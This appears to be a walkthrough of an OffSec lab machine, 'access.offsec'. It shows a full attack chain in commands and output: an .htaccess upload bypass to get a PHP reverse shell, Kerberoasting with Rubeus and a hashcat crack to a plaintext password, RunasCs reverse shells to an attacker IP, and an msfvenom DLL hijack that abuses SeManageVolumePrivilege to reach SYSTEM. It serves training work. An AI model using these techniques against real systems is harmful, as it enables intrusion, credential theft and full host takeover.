The file is being treated as Content-type text-plain. It's not being executed. Apache’s behavior depends on MIME type mappings and handlers defined in its configuration. By default, Apache only executes .php files as PHP if it’s told to do so (e.g., AddType application/x-httpd-php .php). On some hardened servers, admins disable execution of .php files in upload directories (e.g., via RemoveHandler .php or php_admin_flag engine off). As a result, when uploading shell.php1, it won’t be executed,  Apache just serves it as text.

Apache allows per-directory overrides through .htaccess. If the parent directory has AllowOverride FileInfo (or All) enabled, then .htaccess rules like AddType are honored. This trick bypasses restrictions on .php while still letting you get code execution by hiding behind a “safe” extension, for instance php9.

```html
POST /Ticket.php HTTP/1.1
Host: access.offsec
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------229494136323803947671486484565
Content-Length: 764
Origin: http://access.offsec
Connection: keep-alive
Referer: http://access.offsec/index.html
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------229494136323803947671486484565
Content-Disposition: form-data; name="your-name"

lala
-----------------------------229494136323803947671486484565
Content-Disposition: form-data; name="your-email"

lala@lala.com
-----------------------------229494136323803947671486484565
Content-Disposition: form-data; name="ticket-type"

standard-access
-----------------------------229494136323803947671486484565
Content-Disposition: form-data; name="the_file"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .php9
-----------------------------229494136323803947671486484565
Content-Disposition: form-data; name="submit"

Purchase
-----------------------------229494136323803947671486484565--

```

After that, upload again the reverse shell with extension php9 (or any other set in the .htaccess file), set the listerner again and execute it. 

A reverse shell is triggered. After basic enumeration, the user is svc_apache. There is another user under  C:\Users: mysql_svc.  Pivot to that user.

Upload Rubeus.exe using the web interface http://access.offsec and run it from the reverse shell:

```powershell
.\Rubeus.exe kerberoast /stats
```

Output:

```
 ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting

[*] Listing statistics about target users, no ticket requests being performed.
[*] Target Domain          : access.offsec
[*] Searching path 'LDAP://SERVER.access.offsec/DC=access,DC=offsec' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


 ------------------------------------- 
 | Supported Encryption Type | Count |
 ------------------------------------- 
 | RC4_HMAC_DEFAULT          | 1     |
 ------------------------------------- 

 ---------------------------------- 
 | Password Last Set Year | Count |
 ---------------------------------- 
 | 2022                   | 1     |
 ---------------------------------- 

```

Dump hash for kerberoastable user:

```powershell
.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

type hashes.txt
```

Output:

```
$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$6BCE2915537653EF5819BB71503AC454$8586FBA1181FFB1E2DE010493A090C5632F28A1B8C5F744F231527CC0A90F1A3A6773F154EAFD092DA86D3F8071457F89F4FF2B8BE3048FAA135F196531A79BDFCE1782B39B91DAD0343C1AECD2F7E35C21272F311EF33A7E9FA6C813A20444A95AB59485BA36AA9966D6028EE7CC38707781B1EA3F0A06ABC566F5DA1CD1828D4425443B8A80A07C1EAD78D5C3115760D55CBC0B52464EAFB08EB0BAB73980D6356C4932D12BA296731E174249B5CB57CE971C6A53FB5B2637E1C432038CDDEB2437F158B1FDAE09DA3FC3F3D1F13D2D755A54EABBDCD57E527B643045A5DCC794756C3932B2D1E41F9C7D72F2C33740FD42B3BA664D1B7A0FC18D55EA54B45B14138F92E949D3305809B31CE103A6B00D7B1A878B250F5A66D889F0E6F2D1A1DC39723567517A704548E67513175452E964C59E4EE75DFA9FB4F79FF1C4EF937FA0A7928C2A03219CFE90977AE2FB20BF1D33FBE41A3DB06205630E6A88F91325DB1132F829E69FA5F50AABF279B4DD71FC529EFF2F2C0032D6E8DE87676FCE5A68ADC8E20045C83AE84A7A3610974C559BC438EFD278CABCA6FAEA68D9116F6E89EAE0BC127EBF92040A34D503E0F6F709D54711B170C4DB9ADD38D103C6759467E3CDFB883BD38E312FF6482961ED907DC41FD83384919514A8B62DD30FDC6F295AC08075940FC224B8EB1555AADBD4AE943308A6FCEDC8D7F23EA5D03594F1927B0FC5B9F02F88802B0BE68FD7AD318760203ED7958EC7FCCF26799AAF6A858CB45EE1C5B9CA387B978787CB1E1C6555E619B132D06EE0266BDA338E3AF64FF6AAA028FE1CBCB200C08025E3CADA9F16D6BB4E52DDE44B857612B042743A23D825549EE67AF16570CB981917BB0366D6D452D888D7224291595869464C4D0E2DE17BF54437926AEC512E70F2F26666392FB202FD007DF1726C53F96B0F5CE93CD4BE863A38E5DAFE9CFCBDA948F531C2B12431791C90C812843B7E3F99E8190A046A131F09325164645695FC8DF8DB44B44C6A74E3383FEC5F2F6EA3C8ACF8AD1BC0EE5E1633F59DC85E3BA9E3BC1D0919F3C1D3C15D8EF21C9132DF450C9D96557FB98CD3246A7AC95E038FF6710A17D3ECF3B55BC7F7DB242875E89840A1D2FA85C06C025CB787347259454327C249EB999298116E07AB5801D9F8368163C612A73D5C20BCADBF68D828A7D0AE4FFF05A82A321D593E7E7BA3E25AE2DA21BEC740E78A5836B35F5B9436FC35F750B00D8624779C337B3FBD176E7FC3BBE68F65D7814C2DFAF582822B708174799D11DA4EF66704B80DC77B60B8C8ADD6720107AD887571B412A4C7BE6260A9F6B7E449661C30F1EE6EE48E809FF0A6225439FEDE0FBB14DE5C182F131E5F2F29874705300EF14CD395D168BC43080CC5D8FE8C0F92669A55234081FE499D2FD29F33164959986084AC4DBE05D2B8CE7B4921C6F4A99A0C371383C3920404A51225E6784600ADA40D73BBA8D52C330A1CB1BAD6A856AA7327BA173B90878B0FB12EA589353609EBD6912F4DD83F0F4075E005DEBBF552F9CA3371477986D6C3B96D42D629B1AA4880DADBF9068EC60E86F1904B726A411070989CD755AA19B73ECFB
```


Crack the hash offline:

```bash
hashcat -m 13100 myssql.hash /usr/share/wordlists/rockyou.txt
```

Output:

```
svc_mssql:trustno1
```


Build a /etc/krb5.conf file:

```
[libdefaults]
  default_realm = ACCESS.OFFSEC
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  ACCESS.OFFSEC = {
    kdc = DC.access.offsec
    admin_server = DC.access.offsec
  }

[domain_realm]
  .access.offsec = ACCESS.OFFSEC
  access.offsec = ACCESS.OFFSEC
```

Beforehand, krb installation is needed:

```bash
sudo apt install krb5-user  
```

Update /etc/hosts to:

```
192.168.156.187   DC.access.offsec access.offsec
```

Now, synchronize the attacker machine with DC:

```bash
sudo apt install ntpsec-ntpdate


sudo ntpdate -s 192.168.156.187
sudo ntpdate -s DC.access.offsec    
```

Create a TGT ticket using impacket. Directly asks the KDC for a TGT, saves it as a .ccache file. Export KRB5CCNAME to use it.

```bash
getTGT.py access.offsec/'svc_mssql':'trustno1'

export KRB5CCNAME=$(pwd)/svc_mssql.ccache
```

List stored tickets:

```bash
klist -l
```

Check ldap connection:

```bash
nxc ldap access.offsec -u svc_mssql -p 'trustno1'  -k 
```

Check smb connection:

```bash
nxc smb dc.access.offsec -u svc_mssql -p 'trustno1' -k --shares
```

However, relying on this ticket for connection produced the VPN to fail. For further analysis upload the collector SharpHound.exe and run it in the Apache session:

```powershell
.\SharpHound.exe -c All --zipfilename apache
```

Download output to the attacker machine, run bloodhound.

An alternative way is used for pivoting to svc_myssql user.  Use the binary RunasCs.exe from: https://github.com/antonioCoco/RunasCs/releases. Forked in the tester repo: https://github.com/amandaguglieri/RunasCs

Upload the binary to the machine and set a listener in a different terminal of the attacker's machine:

```bash
nc -lnvp 2222
```

Run a reverse shell from the reverse shell with user svc_apache:

```powershell
.\RunasCS.exe svc_mssql trustno1  powershell.exe -r 192.168.45.236:2222
```

Now, the user svc_mssql can print the flag:

```powershell
type C:\Users\svc_mssql\Desktop\local.txt
```



## proof.txt

All files will be uploaded using the user interface at http://access.offsec.


The user has `SeManageVolumePrivilege`:

```powershell
whoami /priv
```

Enable all privileges with:

```powershell
Import-Module .\EnableAllTokenPrivs.ps1`
```

Output:

```powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State  
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled

```


Download and transfer `SeManageVolumeExploit.exe` to the target. Original repo is at https://github.com/xct/SeManageVolumeAbuse. My forked version  https://github.com/amandaguglieri/SeManageVolumeAbuse.git has already the binary compiled at:

```
https://github.com/amandaguglieri/SeManageVolumeAbuse/releases/download/1.0/SeManageVolumeAbuse.exe
```

Execute the exploit to gain write privileges to `C:\Windows\System32\`:

```powershell
.\SeManageVolumeExploit.exe
```

Create a malicious DLL payload with `msfvenom` in the attacker machine:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=1337 -f dll -o tzres.dll
```

Transfer the malicious DLL to the target machine and place it in the WBEM directory:  

```powershell
copy tzres.dll C:\Windows\System32\wbem\
```

 Set up a Netcat listener on the attacking machine:

```bash
nc -lnvp 1337
```    

Activate the payload by running:

```powershell
systeminfo
```

Print the flag:

```powershell
type c:\Users\Administrator\Desktop\proof.txt
```

